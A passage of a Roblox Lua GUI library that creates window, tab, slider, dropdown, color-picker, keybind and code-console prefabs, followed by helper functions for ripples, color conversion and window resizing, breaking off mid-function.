	Tab.Size = UDim2.new(1, 0, 1, 0)
	Tab.Visible = false

	UIListLayout_2.Parent = Tab
	UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_2.Padding = UDim.new(0, 5)

	TextBox.Parent = Prefabs
	TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
	TextBox.BackgroundTransparency = 1
	TextBox.BorderSizePixel = 0
	TextBox.Size = UDim2.new(1, 0, 0, 20)
	TextBox.ZIndex = 2
	TextBox.Font = Enum.Font.GothamSemibold
	TextBox.PlaceholderColor3 = Color3.new(0.698039, 0.698039, 0.698039)
	TextBox.PlaceholderText = "Input Text"
	TextBox.Text = ""
	TextBox.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
	TextBox.TextSize = 14

	TextBox_Roundify_4px.Name = "TextBox_Roundify_4px"
	TextBox_Roundify_4px.Parent = TextBox
	TextBox_Roundify_4px.BackgroundColor3 = Color3.new(1, 1, 1)
	TextBox_Roundify_4px.BackgroundTransparency = 1
	TextBox_Roundify_4px.Size = UDim2.new(1, 0, 1, 0)
	TextBox_Roundify_4px.Image = "rbxassetid://2851929490"
	TextBox_Roundify_4px.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
	TextBox_Roundify_4px.ScaleType = Enum.ScaleType.Slice
	TextBox_Roundify_4px.SliceCenter = Rect.new(4, 4, 4, 4)

	Slider.Name = "Slider"
	Slider.Parent = Prefabs
	Slider.BackgroundColor3 = Color3.new(1, 1, 1)
	Slider.BackgroundTransparency = 1
	Slider.Position = UDim2.new(0, 0, 0.178571433, 0)
	Slider.Size = UDim2.new(1, 0, 0, 20)
	Slider.Image = "rbxassetid://2851929490"
	Slider.ImageColor3 = Color3.new(0.145098, 0.14902, 0.156863)
	Slider.ScaleType = Enum.ScaleType.Slice
	Slider.SliceCenter = Rect.new(4, 4, 4, 4)

	Title_2.Name = "Title"
	Title_2.Parent = Slider
	Title_2.BackgroundColor3 = Color3.new(1, 1, 1)
	Title_2.BackgroundTransparency = 1
	Title_2.Position = UDim2.new(0.5, 0, 0.5, -10)
	Title_2.Size = UDim2.new(0, 0, 0, 20)
	Title_2.ZIndex = 2
	Title_2.Font = Enum.Font.GothamBold
	Title_2.Text = "Slider"
	Title_2.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
	Title_2.TextSize = 14

	Indicator.Name = "Indicator"
	Indicator.Parent = Slider
	Indicator.BackgroundColor3 = Color3.new(1, 1, 1)
	Indicator.BackgroundTransparency = 1
	Indicator.Size = UDim2.new(0, 0, 0, 20)
	Indicator.Image = "rbxassetid://2851929490"
	Indicator.ImageColor3 = Color3.new(0.254902, 0.262745, 0.278431)
	Indicator.ScaleType = Enum.ScaleType.Slice
	Indicator.SliceCenter = Rect.new(4, 4, 4, 4)

	Value.Name = "Value"
	Value.Parent = Slider
	Value.BackgroundColor3 = Color3.new(1, 1, 1)
	Value.BackgroundTransparency = 1
	Value.Position = UDim2.new(1, -55, 0.5, -10)
	Value.Size = UDim2.new(0, 50, 0, 20)
	Value.Font = Enum.Font.GothamBold
	Value.Text = "0%"
	Value.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
	Value.TextSize = 14

	TextLabel.Parent = Slider
	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Position = UDim2.new(1, -20, -0.75, 0)
	TextLabel.Size = UDim2.new(0, 26, 0, 50)
	TextLabel.Font = Enum.Font.GothamBold
	TextLabel.Text = "]"
	TextLabel.TextColor3 = Color3.new(0.627451, 0.627451, 0.627451)
	TextLabel.TextSize = 14

	TextLabel_2.Parent = Slider
	TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_2.BackgroundTransparency = 1
	TextLabel_2.Position = UDim2.new(1, -65, -0.75, 0)
	TextLabel_2.Size = UDim2.new(0, 26, 0, 50)
	TextLabel_2.Font = Enum.Font.GothamBold
	TextLabel_2.Text = "["
	TextLabel_2.TextColor3 = Color3.new(0.627451, 0.627451, 0.627451)
	TextLabel_2.TextSize = 14

	Circle.Name = "Circle"
	Circle.Parent = Prefabs
	Circle.BackgroundColor3 = Color3.new(1, 1, 1)
	Circle.BackgroundTransparency = 1
	Circle.Image = "rbxassetid://266543268"
	Circle.ImageTransparency = 0.5

	UIListLayout_3.Parent = Prefabs
	UIListLayout_3.FillDirection = Enum.FillDirection.Horizontal
	UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_3.Padding = UDim.new(0, 20)

	Dropdown.Name = "Dropdown"
	Dropdown.Parent = Prefabs
	Dropdown.BackgroundColor3 = Color3.new(1, 1, 1)
	Dropdown.BackgroundTransparency = 1
	Dropdown.BorderSizePixel = 0
	Dropdown.Position = UDim2.new(-0.055555556, 0, 0.0833333284, 0)
	Dropdown.Size = UDim2.new(0, 200, 0, 20)
	Dropdown.ZIndex = 2
	Dropdown.Font = Enum.Font.GothamBold
	Dropdown.Text = "      Dropdown"
	Dropdown.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
	Dropdown.TextSize = 14
	Dropdown.TextXAlignment = Enum.TextXAlignment.Left

	Indicator_2.Name = "Indicator"
	Indicator_2.Parent = Dropdown
	Indicator_2.BackgroundColor3 = Color3.new(1, 1, 1)
	Indicator_2.BackgroundTransparency = 1
	Indicator_2.Position = UDim2.new(0.899999976, -10, 0.100000001, 0)
	Indicator_2.Rotation = -90
	Indicator_2.Size = UDim2.new(0, 15, 0, 15)
	Indicator_2.ZIndex = 2
	Indicator_2.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4744658743"

	Box.Name = "Box"
	Box.Parent = Dropdown
	Box.BackgroundColor3 = Color3.new(1, 1, 1)
	Box.BackgroundTransparency = 1
	Box.Position = UDim2.new(0, 0, 0, 25)
	Box.Size = UDim2.new(1, 0, 0, 150)
	Box.ZIndex = 3
	Box.Image = "rbxassetid://2851929490"
	Box.ImageColor3 = Color3.new(0.129412, 0.133333, 0.141176)
	Box.ScaleType = Enum.ScaleType.Slice
	Box.SliceCenter = Rect.new(4, 4, 4, 4)

	Objects.Name = "Objects"
	Objects.Parent = Box
	Objects.BackgroundColor3 = Color3.new(1, 1, 1)
	Objects.BackgroundTransparency = 1
	Objects.BorderSizePixel = 0
	Objects.Size = UDim2.new(1, 0, 1, 0)
	Objects.ZIndex = 3
	Objects.CanvasSize = UDim2.new(0, 0, 0, 0)
	Objects.ScrollBarThickness = 8

	UIListLayout_4.Parent = Objects
	UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder

	TextButton_Roundify_4px.Name = "TextButton_Roundify_4px"
	TextButton_Roundify_4px.Parent = Dropdown
	TextButton_Roundify_4px.BackgroundColor3 = Color3.new(1, 1, 1)
	TextButton_Roundify_4px.BackgroundTransparency = 1
	TextButton_Roundify_4px.Size = UDim2.new(1, 0, 1, 0)
	TextButton_Roundify_4px.Image = "rbxassetid://2851929490"
	TextButton_Roundify_4px.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
	TextButton_Roundify_4px.ScaleType = Enum.ScaleType.Slice
	TextButton_Roundify_4px.SliceCenter = Rect.new(4, 4, 4, 4)

	TabButton.Name = "TabButton"
	TabButton.Parent = Prefabs
	TabButton.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	TabButton.BackgroundTransparency = 1
	TabButton.BorderSizePixel = 0
	TabButton.Position = UDim2.new(0.185185179, 0, 0, 0)
	TabButton.Size = UDim2.new(0, 71, 0, 20)
	TabButton.ZIndex = 2
	TabButton.Font = Enum.Font.GothamSemibold
	TabButton.Text = "Test tab"
	TabButton.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
	TabButton.TextSize = 14

	TextButton_Roundify_4px_2.Name = "TextButton_Roundify_4px"
	TextButton_Roundify_4px_2.Parent = TabButton
	TextButton_Roundify_4px_2.BackgroundColor3 = Color3.new(1, 1, 1)
	TextButton_Roundify_4px_2.BackgroundTransparency = 1
	TextButton_Roundify_4px_2.Size = UDim2.new(1, 0, 1, 0)
	TextButton_Roundify_4px_2.Image = "rbxassetid://2851929490"
	TextButton_Roundify_4px_2.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
	TextButton_Roundify_4px_2.ScaleType = Enum.ScaleType.Slice
	TextButton_Roundify_4px_2.SliceCenter = Rect.new(4, 4, 4, 4)

	Folder.Name = "Folder"
	Folder.Parent = Prefabs
	Folder.BackgroundColor3 = Color3.new(1, 1, 1)
	Folder.BackgroundTransparency = 1
	Folder.Position = UDim2.new(0, 0, 0, 50)
	Folder.Size = UDim2.new(1, 0, 0, 20)
	Folder.Image = "rbxassetid://2851929490"
	Folder.ImageColor3 = Color3.new(0.0823529, 0.0862745, 0.0901961)
	Folder.ScaleType = Enum.ScaleType.Slice
	Folder.SliceCenter = Rect.new(4, 4, 4, 4)

	Button.Name = "Button"
	Button.Parent = Folder
	Button.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	Button.BackgroundTransparency = 1
	Button.BorderSizePixel = 0
	Button.Size = UDim2.new(1, 0, 0, 20)
	Button.ZIndex = 2
	Button.Font = Enum.Font.GothamSemibold
	Button.Text = "      Folder"
	Button.TextColor3 = Color3.new(1, 1, 1)
	Button.TextSize = 14
	Button.TextXAlignment = Enum.TextXAlignment.Left

	TextButton_Roundify_4px_3.Name = "TextButton_Roundify_4px"
	TextButton_Roundify_4px_3.Parent = Button
	TextButton_Roundify_4px_3.BackgroundColor3 = Color3.new(1, 1, 1)
	TextButton_Roundify_4px_3.BackgroundTransparency = 1
	TextButton_Roundify_4px_3.Size = UDim2.new(1, 0, 1, 0)
	TextButton_Roundify_4px_3.Image = "rbxassetid://2851929490"
	TextButton_Roundify_4px_3.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	TextButton_Roundify_4px_3.ScaleType = Enum.ScaleType.Slice
	TextButton_Roundify_4px_3.SliceCenter = Rect.new(4, 4, 4, 4)

	Toggle_2.Name = "Toggle"
	Toggle_2.Parent = Button
	Toggle_2.BackgroundColor3 = Color3.new(1, 1, 1)
	Toggle_2.BackgroundTransparency = 1
	Toggle_2.Position = UDim2.new(0, 5, 0, 0)
	Toggle_2.Size = UDim2.new(0, 20, 0, 20)
	Toggle_2.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4731371541"

	Objects_2.Name = "Objects"
	Objects_2.Parent = Folder
	Objects_2.BackgroundColor3 = Color3.new(1, 1, 1)
	Objects_2.BackgroundTransparency = 1
	Objects_2.Position = UDim2.new(0, 10, 0, 25)
	Objects_2.Size = UDim2.new(1, -10, 1, -25)
	Objects_2.Visible = false

	UIListLayout_5.Parent = Objects_2
	UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_5.Padding = UDim.new(0, 5)

	HorizontalAlignment.Name = "HorizontalAlignment"
	HorizontalAlignment.Parent = Prefabs
	HorizontalAlignment.BackgroundColor3 = Color3.new(1, 1, 1)
	HorizontalAlignment.BackgroundTransparency = 1
	HorizontalAlignment.Size = UDim2.new(1, 0, 0, 20)

	UIListLayout_6.Parent = HorizontalAlignment
	UIListLayout_6.FillDirection = Enum.FillDirection.Horizontal
	UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_6.Padding = UDim.new(0, 5)

	Console.Name = "Console"
	Console.Parent = Prefabs
	Console.BackgroundColor3 = Color3.new(1, 1, 1)
	Console.BackgroundTransparency = 1
	Console.Size = UDim2.new(1, 0, 0, 200)
	Console.Image = "rbxassetid://2851928141"
	Console.ImageColor3 = Color3.new(0.129412, 0.133333, 0.141176)
	Console.ScaleType = Enum.ScaleType.Slice
	Console.SliceCenter = Rect.new(8, 8, 8, 8)

	ScrollingFrame.Parent = Console
	ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
	ScrollingFrame.BackgroundTransparency = 1
	ScrollingFrame.BorderSizePixel = 0
	ScrollingFrame.Size = UDim2.new(1, 0, 1, 1)
	ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	ScrollingFrame.ScrollBarThickness = 4

	Source.Name = "Source"
	Source.Parent = ScrollingFrame
	Source.BackgroundColor3 = Color3.new(1, 1, 1)
	Source.BackgroundTransparency = 1
	Source.Position = UDim2.new(0, 40, 0, 0)
	Source.Size = UDim2.new(1, -40, 0, 10000)
	Source.ZIndex = 3
	Source.ClearTextOnFocus = false
	Source.Font = Enum.Font.Code
	Source.MultiLine = true
	Source.PlaceholderColor3 = Color3.new(0.8, 0.8, 0.8)
	Source.Text = ""
	Source.TextColor3 = Color3.new(1, 1, 1)
	Source.TextSize = 15
	Source.TextStrokeColor3 = Color3.new(1, 1, 1)
	Source.TextWrapped = true
	Source.TextXAlignment = Enum.TextXAlignment.Left
	Source.TextYAlignment = Enum.TextYAlignment.Top

	Comments.Name = "Comments"
	Comments.Parent = Source
	Comments.BackgroundColor3 = Color3.new(1, 1, 1)
	Comments.BackgroundTransparency = 1
	Comments.Size = UDim2.new(1, 0, 1, 0)
	Comments.ZIndex = 5
	Comments.Font = Enum.Font.Code
	Comments.Text = ""
	Comments.TextColor3 = Color3.new(0.231373, 0.784314, 0.231373)
	Comments.TextSize = 15
	Comments.TextXAlignment = Enum.TextXAlignment.Left
	Comments.TextYAlignment = Enum.TextYAlignment.Top

	Globals.Name = "Globals"
	Globals.Parent = Source
	Globals.BackgroundColor3 = Color3.new(1, 1, 1)
	Globals.BackgroundTransparency = 1
	Globals.Size = UDim2.new(1, 0, 1, 0)
	Globals.ZIndex = 5
	Globals.Font = Enum.Font.Code
	Globals.Text = ""
	Globals.TextColor3 = Color3.new(0.517647, 0.839216, 0.968628)
	Globals.TextSize = 15
	Globals.TextXAlignment = Enum.TextXAlignment.Left
	Globals.TextYAlignment = Enum.TextYAlignment.Top

	Keywords.Name = "Keywords"
	Keywords.Parent = Source
	Keywords.BackgroundColor3 = Color3.new(1, 1, 1)
	Keywords.BackgroundTransparency = 1
	Keywords.Size = UDim2.new(1, 0, 1, 0)
	Keywords.ZIndex = 5
	Keywords.Font = Enum.Font.Code
	Keywords.Text = ""
	Keywords.TextColor3 = Color3.new(0.972549, 0.427451, 0.486275)
	Keywords.TextSize = 15
	Keywords.TextXAlignment = Enum.TextXAlignment.Left
	Keywords.TextYAlignment = Enum.TextYAlignment.Top

	RemoteHighlight.Name = "RemoteHighlight"
	RemoteHighlight.Parent = Source
	RemoteHighlight.BackgroundColor3 = Color3.new(1, 1, 1)
	RemoteHighlight.BackgroundTransparency = 1
	RemoteHighlight.Size = UDim2.new(1, 0, 1, 0)
	RemoteHighlight.ZIndex = 5
	RemoteHighlight.Font = Enum.Font.Code
	RemoteHighlight.Text = ""
	RemoteHighlight.TextColor3 = Color3.new(0, 0.568627, 1)
	RemoteHighlight.TextSize = 15
	RemoteHighlight.TextXAlignment = Enum.TextXAlignment.Left
	RemoteHighlight.TextYAlignment = Enum.TextYAlignment.Top

	Strings.Name = "Strings"
	Strings.Parent = Source
	Strings.BackgroundColor3 = Color3.new(1, 1, 1)
	Strings.BackgroundTransparency = 1
	Strings.Size = UDim2.new(1, 0, 1, 0)
	Strings.ZIndex = 5
	Strings.Font = Enum.Font.Code
	Strings.Text = ""
	Strings.TextColor3 = Color3.new(0.678431, 0.945098, 0.584314)
	Strings.TextSize = 15
	Strings.TextXAlignment = Enum.TextXAlignment.Left
	Strings.TextYAlignment = Enum.TextYAlignment.Top

	Tokens.Name = "Tokens"
	Tokens.Parent = Source
	Tokens.BackgroundColor3 = Color3.new(1, 1, 1)
	Tokens.BackgroundTransparency = 1
	Tokens.Size = UDim2.new(1, 0, 1, 0)
	Tokens.ZIndex = 5
	Tokens.Font = Enum.Font.Code
	Tokens.Text = ""
	Tokens.TextColor3 = Color3.new(1, 1, 1)
	Tokens.TextSize = 15
	Tokens.TextXAlignment = Enum.TextXAlignment.Left
	Tokens.TextYAlignment = Enum.TextYAlignment.Top

	Numbers.Name = "Numbers"
	Numbers.Parent = Source
	Numbers.BackgroundColor3 = Color3.new(1, 1, 1)
	Numbers.BackgroundTransparency = 1
	Numbers.Size = UDim2.new(1, 0, 1, 0)
	Numbers.ZIndex = 4
	Numbers.Font = Enum.Font.Code
	Numbers.Text = ""
	Numbers.TextColor3 = Color3.new(1, 0.776471, 0)
	Numbers.TextSize = 15
	Numbers.TextXAlignment = Enum.TextXAlignment.Left
	Numbers.TextYAlignment = Enum.TextYAlignment.Top

	Info.Name = "Info"
	Info.Parent = Source
	Info.BackgroundColor3 = Color3.new(1, 1, 1)
	Info.BackgroundTransparency = 1
	Info.Size = UDim2.new(1, 0, 1, 0)
	Info.ZIndex = 5
	Info.Font = Enum.Font.Code
	Info.Text = ""
	Info.TextColor3 = Color3.new(0, 0.635294, 1)
	Info.TextSize = 15
	Info.TextXAlignment = Enum.TextXAlignment.Left
	Info.TextYAlignment = Enum.TextYAlignment.Top

	Lines.Name = "Lines"
	Lines.Parent = ScrollingFrame
	Lines.BackgroundColor3 = Color3.new(1, 1, 1)
	Lines.BackgroundTransparency = 1
	Lines.BorderSizePixel = 0
	Lines.Size = UDim2.new(0, 40, 0, 10000)
	Lines.ZIndex = 4
	Lines.Font = Enum.Font.Code
	Lines.Text = "1\n"
	Lines.TextColor3 = Color3.new(1, 1, 1)
	Lines.TextSize = 15
	Lines.TextWrapped = true
	Lines.TextYAlignment = Enum.TextYAlignment.Top

	ColorPicker.Name = "ColorPicker"
	ColorPicker.Parent = Prefabs
	ColorPicker.BackgroundColor3 = Color3.new(1, 1, 1)
	ColorPicker.BackgroundTransparency = 1
	ColorPicker.Size = UDim2.new(0, 180, 0, 110)
	ColorPicker.Image = "rbxassetid://2851929490"
	ColorPicker.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
	ColorPicker.ScaleType = Enum.ScaleType.Slice
	ColorPicker.SliceCenter = Rect.new(4, 4, 4, 4)

	Palette.Name = "Palette"
	Palette.Parent = ColorPicker
	Palette.BackgroundColor3 = Color3.new(1, 1, 1)
	Palette.BackgroundTransparency = 1
	Palette.Position = UDim2.new(0.0500000007, 0, 0.0500000007, 0)
	Palette.Size = UDim2.new(0, 100, 0, 100)
	Palette.Image = "rbxassetid://698052001"
	Palette.ScaleType = Enum.ScaleType.Slice
	Palette.SliceCenter = Rect.new(4, 4, 4, 4)

	Indicator_3.Name = "Indicator"
	Indicator_3.Parent = Palette
	Indicator_3.BackgroundColor3 = Color3.new(1, 1, 1)
	Indicator_3.BackgroundTransparency = 1
	Indicator_3.Size = UDim2.new(0, 5, 0, 5)
	Indicator_3.ZIndex = 2
	Indicator_3.Image = "rbxassetid://2851926732"
	Indicator_3.ImageColor3 = Color3.new(0, 0, 0)
	Indicator_3.ScaleType = Enum.ScaleType.Slice
	Indicator_3.SliceCenter = Rect.new(12, 12, 12, 12)

	Sample.Name = "Sample"
	Sample.Parent = ColorPicker
	Sample.BackgroundColor3 = Color3.new(1, 1, 1)
	Sample.BackgroundTransparency = 1
	Sample.Position = UDim2.new(0.800000012, 0, 0.0500000007, 0)
	Sample.Size = UDim2.new(0, 25, 0, 25)
	Sample.Image = "rbxassetid://2851929490"
	Sample.ScaleType = Enum.ScaleType.Slice
	Sample.SliceCenter = Rect.new(4, 4, 4, 4)

	Saturation.Name = "Saturation"
	Saturation.Parent = ColorPicker
	Saturation.BackgroundColor3 = Color3.new(1, 1, 1)
	Saturation.Position = UDim2.new(0.649999976, 0, 0.0500000007, 0)
	Saturation.Size = UDim2.new(0, 15, 0, 100)
	Saturation.Image = "rbxassetid://3641079629"

	Indicator_4.Name = "Indicator"
	Indicator_4.Parent = Saturation
	Indicator_4.BackgroundColor3 = Color3.new(1, 1, 1)
	Indicator_4.BorderSizePixel = 0
	Indicator_4.Size = UDim2.new(0, 20, 0, 2)
	Indicator_4.ZIndex = 2

	Switch.Name = "Switch"
	Switch.Parent = Prefabs
	Switch.BackgroundColor3 = Color3.new(1, 1, 1)
	Switch.BackgroundTransparency = 1
	Switch.BorderSizePixel = 0
	Switch.Position = UDim2.new(0.229411766, 0, 0.20714286, 0)
	Switch.Size = UDim2.new(0, 20, 0, 20)
	Switch.ZIndex = 2
	Switch.Font = Enum.Font.SourceSans
	Switch.Text = ""
	Switch.TextColor3 = Color3.new(1, 1, 1)
	Switch.TextSize = 18

	TextButton_Roundify_4px_4.Name = "TextButton_Roundify_4px"
	TextButton_Roundify_4px_4.Parent = Switch
	TextButton_Roundify_4px_4.BackgroundColor3 = Color3.new(1, 1, 1)
	TextButton_Roundify_4px_4.BackgroundTransparency = 1
	TextButton_Roundify_4px_4.Size = UDim2.new(1, 0, 1, 0)
	TextButton_Roundify_4px_4.Image = "rbxassetid://2851929490"
	TextButton_Roundify_4px_4.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	TextButton_Roundify_4px_4.ImageTransparency = 0.5
	TextButton_Roundify_4px_4.ScaleType = Enum.ScaleType.Slice
	TextButton_Roundify_4px_4.SliceCenter = Rect.new(4, 4, 4, 4)

	Title_3.Name = "Title"
	Title_3.Parent = Switch
	Title_3.BackgroundColor3 = Color3.new(1, 1, 1)
	Title_3.BackgroundTransparency = 1
	Title_3.Position = UDim2.new(1.20000005, 0, 0, 0)
	Title_3.Size = UDim2.new(0, 20, 0, 20)
	Title_3.Font = Enum.Font.GothamSemibold
	Title_3.Text = "Switch"
	Title_3.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
	Title_3.TextSize = 14
	Title_3.TextXAlignment = Enum.TextXAlignment.Left

	Button_2.Name = "Button"
	Button_2.Parent = Prefabs
	Button_2.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	Button_2.BackgroundTransparency = 1
	Button_2.BorderSizePixel = 0
	Button_2.Size = UDim2.new(0, 91, 0, 20)
	Button_2.ZIndex = 2
	Button_2.Font = Enum.Font.GothamSemibold
	Button_2.TextColor3 = Color3.new(1, 1, 1)
	Button_2.TextSize = 14

	TextButton_Roundify_4px_5.Name = "TextButton_Roundify_4px"
	TextButton_Roundify_4px_5.Parent = Button_2
	TextButton_Roundify_4px_5.BackgroundColor3 = Color3.new(1, 1, 1)
	TextButton_Roundify_4px_5.BackgroundTransparency = 1
	TextButton_Roundify_4px_5.Size = UDim2.new(1, 0, 1, 0)
	TextButton_Roundify_4px_5.Image = "rbxassetid://2851929490"
	TextButton_Roundify_4px_5.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	TextButton_Roundify_4px_5.ScaleType = Enum.ScaleType.Slice
	TextButton_Roundify_4px_5.SliceCenter = Rect.new(4, 4, 4, 4)

	DropdownButton.Name = "DropdownButton"
	DropdownButton.Parent = Prefabs
	DropdownButton.BackgroundColor3 = Color3.new(0.129412, 0.133333, 0.141176)
	DropdownButton.BorderSizePixel = 0
	DropdownButton.Size = UDim2.new(1, 0, 0, 20)
	DropdownButton.ZIndex = 3
	DropdownButton.Font = Enum.Font.GothamBold
	DropdownButton.Text = "      Button"
	DropdownButton.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
	DropdownButton.TextSize = 14
	DropdownButton.TextXAlignment = Enum.TextXAlignment.Left

	Keybind.Name = "Keybind"
	Keybind.Parent = Prefabs
	Keybind.BackgroundColor3 = Color3.new(1, 1, 1)
	Keybind.BackgroundTransparency = 1
	Keybind.Size = UDim2.new(0, 200, 0, 20)
	Keybind.Image = "rbxassetid://2851929490"
	Keybind.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
	Keybind.ScaleType = Enum.ScaleType.Slice
	Keybind.SliceCenter = Rect.new(4, 4, 4, 4)

	Title_4.Name = "Title"
	Title_4.Parent = Keybind
	Title_4.BackgroundColor3 = Color3.new(1, 1, 1)
	Title_4.BackgroundTransparency = 1
	Title_4.Size = UDim2.new(0, 0, 1, 0)
	Title_4.Font = Enum.Font.GothamBold
	Title_4.Text = "Keybind"
	Title_4.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
	Title_4.TextSize = 14
	Title_4.TextXAlignment = Enum.TextXAlignment.Left

	Input.Name = "Input"
	Input.Parent = Keybind
	Input.BackgroundColor3 = Color3.new(1, 1, 1)
	Input.BackgroundTransparency = 1
	Input.BorderSizePixel = 0
	Input.Position = UDim2.new(1, -85, 0, 2)
	Input.Size = UDim2.new(0, 80, 1, -4)
	Input.ZIndex = 2
	Input.Font = Enum.Font.GothamSemibold
	Input.Text = "RShift"
	Input.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
	Input.TextSize = 12
	Input.TextWrapped = true

	Input_Roundify_4px.Name = "Input_Roundify_4px"
	Input_Roundify_4px.Parent = Input
	Input_Roundify_4px.BackgroundColor3 = Color3.new(1, 1, 1)
	Input_Roundify_4px.BackgroundTransparency = 1
	Input_Roundify_4px.Size = UDim2.new(1, 0, 1, 0)
	Input_Roundify_4px.Image = "rbxassetid://2851929490"
	Input_Roundify_4px.ImageColor3 = Color3.new(0.290196, 0.294118, 0.313726)
	Input_Roundify_4px.ScaleType = Enum.ScaleType.Slice
	Input_Roundify_4px.SliceCenter = Rect.new(4, 4, 4, 4)

	Windows.Name = "Windows"
	Windows.Parent = imgui
	Windows.BackgroundColor3 = Color3.new(1, 1, 1)
	Windows.BackgroundTransparency = 1
	Windows.Position = UDim2.new(0, 20, 0, 20)
	Windows.Size = UDim2.new(1, 20, 1, -20)

	--[[ Script ]]--
	script.Parent = imgui

	local UIS = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	local RS = game:GetService("RunService")
	local ps = game:GetService("Players")

	local p = ps.LocalPlayer
	local mouse = p:GetMouse()

	local Prefabs = script.Parent:WaitForChild("Prefabs")
	local Windows = script.Parent:FindFirstChild("Windows")

	local checks = {
		["binding"] = false,
	}

	UIS.InputBegan:Connect(function(input, gameProcessed)
		if input.KeyCode == ((typeof(ui_options.toggle_key) == "EnumItem") and ui_options.toggle_key or Enum.KeyCode.RightShift) then
			if script.Parent then
				if not checks.binding then
					script.Parent.Enabled = not script.Parent.Enabled
				end
			end
		end
	end)

	local function Resize(part, new, _delay)
		_delay = _delay or 0.5
		local tweenInfo = TweenInfo.new(_delay, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(part, tweenInfo, new)
		tween:Play()
	end

	local function rgbtohsv(r, g, b) -- idk who made this function, but thanks
		r, g, b = r / 255, g / 255, b / 255
		local max, min = math.max(r, g, b), math.min(r, g, b)
		local h, s, v
		v = max

		local d = max - min
		if max == 0 then
			s = 0
		else
			s = d / max
		end

		if max == min then
			h = 0
		else
			if max == r then
				h = (g - b) / d
				if g < b then
					h = h + 6
				end
			elseif max == g then
				h = (b - r) / d + 2
			elseif max == b then
				h = (r - g) / d + 4
			end
			h = h / 6
		end

		return h, s, v
	end

	local function hasprop(object, prop)
		local a, b = pcall(function()
			return object[tostring(prop)]
		end)
		if a then
			return b
		end
	end

	local function gNameLen(obj)
		return obj.TextBounds.X + 15
	end

	local function gMouse()
		return Vector2.new(UIS:GetMouseLocation().X + 1, UIS:GetMouseLocation().Y - 35)
	end

	local function ripple(button, x, y)
		spawn(function()
			button.ClipsDescendants = true

			local circle = Prefabs:FindFirstChild("Circle"):Clone()

			circle.Parent = button
			circle.ZIndex = 1000

			local new_x = x - circle.AbsolutePosition.X
			local new_y = y - circle.AbsolutePosition.Y
			circle.Position = UDim2.new(0, new_x, 0, new_y)

			local size = 0
			if button.AbsoluteSize.X > button.AbsoluteSize.Y then
				size = button.AbsoluteSize.X * 1.5
			elseif button.AbsoluteSize.X < button.AbsoluteSize.Y then
				size = button.AbsoluteSize.Y * 1.5
			elseif button.AbsoluteSize.X == button.AbsoluteSize.Y then
				size = button.AbsoluteSize.X * 1.5
			end

			circle:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, -size / 2, 0.5, -size / 2), "Out", "Quad", 0.5, false, nil)
			Resize(circle, {ImageTransparency = 1}, 0.5)

			wait(0.5)
			circle:Destroy()
		end)
	end

	local windows = 0
	local library = {}

	local function format_windows()
		local ull = Prefabs:FindFirstChild("UIListLayout"):Clone()
		ull.Parent = Windows
		local data = {}

		for i,v in next, Windows:GetChildren() do
			if not (v:IsA("UIListLayout")) then
				data[v] = v.AbsolutePosition
			end
		end

		ull:Destroy()

		for i,v in next, data do
			i.Position = UDim2.new(0, v.X, 0, v.Y)
		end
	end

	function library:FormatWindows()
		format_windows()
	end

	function library:AddWindow(title, options)
		windows = windows + 1
		local dropdown_open = false
		title = tostring(title or "New Window")
		options = (typeof(options) == "table") and options or ui_options
		options.tween_time = 0.1

		local Window = Prefabs:FindFirstChild("Window"):Clone()
		Window.Parent = Windows
		Window:FindFirstChild("Title").Text = title
		Window.Size = UDim2.new(0, options.min_size.X, 0, options.min_size.Y)
		Window.ZIndex = Window.ZIndex + (windows * 10)

		do -- Altering Window Color
			local Title = Window:FindFirstChild("Title")
			local Bar = Window:FindFirstChild("Bar")
			local Base = Bar:FindFirstChild("Base")
			local Top = Bar:FindFirstChild("Top")
			local SplitFrame = Window:FindFirstChild("TabSelection"):FindFirstChild("Frame")
			local Toggle = Bar:FindFirstChild("Toggle")

			spawn(function()
				while true do
					Bar.BackgroundColor3 = options.main_color
					Base.BackgroundColor3 = options.main_color
					Base.ImageColor3 = options.main_color
					Top.ImageColor3 = options.main_color
					SplitFrame.BackgroundColor3 = options.main_color

					RS.Heartbeat:Wait()
				end
			end)

		end

		local Resizer = Window:WaitForChild("Resizer")

		local window_data = {}
		Window.Draggable = true

		do -- Resize Window
			local oldIcon = mouse.Icon
			local Entered = false
			Resizer.MouseEnter:Connect(function()
				Window.Draggable = false
				if options.can_resize then
